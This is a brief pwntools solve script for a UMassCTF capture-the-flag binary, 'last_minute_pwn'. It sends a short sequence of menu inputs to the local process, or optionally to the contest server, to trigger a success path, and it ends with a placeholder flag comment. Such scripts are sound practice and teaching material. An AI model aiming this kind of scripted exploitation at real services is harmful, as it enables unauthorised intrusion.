#!/usr/bin/python3
from pwn import *
# context.log_level='debug'
context.arch='amd64'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process('./last_minute_pwn')
# p=remote("last_minute_pwn.pwn.umasscybersec.org",7293)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
#gdb.attach(p)

sla(b">> ", b"2")
sa(b">> ", b"\n")

r = p.recvline()

if "Success" in r.decode():
    print(p.recvline())
    input()

sl(b"3")

# UMASSCTF{todo:_think_of_a_creative_flag}